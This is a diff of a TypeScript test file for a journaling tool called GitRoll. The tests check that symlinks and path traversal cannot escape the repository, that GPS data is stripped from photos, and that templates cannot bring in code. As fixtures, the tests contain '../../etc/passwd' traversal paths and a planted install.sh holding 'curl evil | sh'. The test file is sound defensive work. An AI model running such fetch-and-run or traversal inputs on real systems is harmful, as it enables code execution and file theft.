@@ -7,22 +7,29 @@ import { findSensitive, removeJpegLocation } from "../src/core/privacy.ts";
 import { GitRoll } from "../src/node/repo.ts";
 import { tmp } from "./helpers.ts";
 
-test("attachment lookup ignores symbolic links that point outside the Roll", () => {
+test("a linked file is never read, and links out of the Roll are refused", () => {
   const roll = GitRoll.init(tmp());
   const outside = path.join(tmp(), "secret.txt");
   fs.writeFileSync(outside, "not part of the Roll");
-  const hex = "a".repeat(64);
-  fs.symlinkSync(outside, path.join(roll.root, "attachments", `${hex}.txt`));
+  fs.mkdirSync(path.join(roll.root, ".gitroll/files"), { recursive: true });
+  fs.symlinkSync(outside, path.join(roll.root, ".gitroll/files/secret.txt"));
 
-  assert.equal(roll.attachmentFile(`sha256:${hex}`), null);
+  assert.equal(roll.attachmentFile(".gitroll/files/secret.txt"), null);
+  assert.equal(roll.attachmentFile("../../etc/passwd"), null);
   assert.ok(roll.check().some((p) => /symbolic link/.test(p.error)), "the validator reports the link");
+
+  // A link in an event's Markdown can't reach outside the repository either.
+  fs.writeFileSync(path.join(roll.root, ".gitroll/events/2026-09-15-escape.md"), "# Escape\n\n[Secrets](../../../etc/passwd)\n");
+  const e = roll.entries().find((x) => x.title === "Escape")!;
+  assert.deepEqual(e.attachments, [], "a link out of the Roll resolves to nothing");
+  assert.ok(roll.check().some((p) => /points outside the Roll/.test(p.error)));
 });
 
 test("writes refuse to follow a linked folder out of the Roll", () => {
   const roll = GitRoll.init(tmp());
   const outside = tmp();
-  fs.mkdirSync(path.join(roll.root, "entries"), { recursive: true });
-  fs.symlinkSync(outside, path.join(roll.root, "entries", String(new Date().getFullYear())));
+  fs.rmSync(path.join(roll.root, ".gitroll/events"), { recursive: true, force: true });
+  fs.symlinkSync(outside, path.join(roll.root, ".gitroll/events"));
 
   assert.throws(() => roll.addEntry({ text: "Should not escape" }), /symbolic links/);
   assert.deepEqual(fs.readdirSync(outside), [], "nothing was written outside");
@@ -31,9 +38,9 @@ test("writes refuse to follow a linked folder out of the Roll", () => {
 test("a linked events folder is reported, not read", () => {
   const roll = GitRoll.init(tmp());
   const outside = tmp();
-  fs.writeFileSync(path.join(outside, "x.md"), "---\nid: x\ncreated: 2026-01-01T00:00:00Z\n---\nhi\n");
-  fs.rmSync(path.join(roll.root, "entries"), { recursive: true });
-  fs.symlinkSync(outside, path.join(roll.root, "entries"));
+  fs.writeFileSync(path.join(outside, "2026-01-01-x.md"), "# Somewhere else\n");
+  fs.rmSync(path.join(roll.root, ".gitroll/events"), { recursive: true, force: true });
+  fs.symlinkSync(outside, path.join(roll.root, ".gitroll/events"));
   const { entries, problems } = roll.load();
   assert.equal(entries.length, 0);
   assert.ok(problems.some((p) => /symbolic link/.test(p.error)));
@@ -72,13 +79,13 @@ test("photos are saved without GPS location", () => {
   const roll = GitRoll.init(tmp());
   const { entry, notices } = roll.save({ text: "Front door" }, [{ name: "door.jpg", type: "image/jpeg", data: original }]);
   assert.match(notices.join(" "), /Removed location data from door\.jpg/);
-  const stored = fs.readFileSync(roll.attachmentFile(entry.attachments[0].hash)!);
+  const stored = fs.readFileSync(roll.attachmentFile(entry.attachments[0].path)!);
   assert.ok(!stored.includes(Buffer.alloc(24, 0x47)), "stored photo has no coordinates");
   assert.deepEqual(roll.check(), []);
 
   fs.appendFileSync(path.join(roll.root, ".gitroll/config.yaml"), "attachments:\n  remove_location: false\n");
   const kept = roll.save({ text: "Keep location" }, [{ name: "kept.jpg", type: "image/jpeg", data: original }]);
-  assert.ok(fs.readFileSync(roll.attachmentFile(kept.entry.attachments[0].hash)!).includes(Buffer.alloc(24, 0x47)));
+  assert.ok(fs.readFileSync(roll.attachmentFile(kept.entry.attachments[0].path)!).includes(Buffer.alloc(24, 0x47)));
 });
 
 test("sensitive text is spotted before it goes into history", () => {
@@ -96,19 +103,15 @@ test("sensitive text is spotted before it goes into history", () => {
 
 test("templates only contribute Roll data, never code or workflows", () => {
   const template = tmp();
-  fs.mkdirSync(path.join(template, ".gitroll/types"), { recursive: true });
+  fs.mkdirSync(path.join(template, ".gitroll"), { recursive: true });
   fs.mkdirSync(path.join(template, ".github/workflows"), { recursive: true });
-  fs.mkdirSync(path.join(template, "projects"), { recursive: true });
-  fs.writeFileSync(path.join(template, ".gitroll/types/vehicle.yaml"), "label: Vehicle\nfields:\n  - key: odometer\n    kind: number\n");
+  fs.writeFileSync(path.join(template, ".gitroll/config.yaml"), "template_version: 1\nname: From template\n");
   fs.writeFileSync(path.join(template, ".gitroll/theme.css"), ":root { --accent: #0f766e; }\n");
-  fs.writeFileSync(path.join(template, "projects/car.yaml"), "name: Car\n");
   fs.writeFileSync(path.join(template, ".github/workflows/steal.yml"), "on: push\n");
   fs.writeFileSync(path.join(template, "install.sh"), "curl evil | sh\n");
 
   const roll = GitRoll.init(tmp(), { name: "From template", template });
-  assert.ok(fs.existsSync(path.join(roll.root, ".gitroll/types/vehicle.yaml")));
   assert.ok(fs.existsSync(path.join(roll.root, ".gitroll/theme.css")));
-  assert.equal(roll.projects()[0].name, "Car");
   assert.ok(!fs.existsSync(path.join(roll.root, ".github")));
   assert.ok(!fs.existsSync(path.join(roll.root, "install.sh")));
   assert.equal(roll.config().name, "From template");
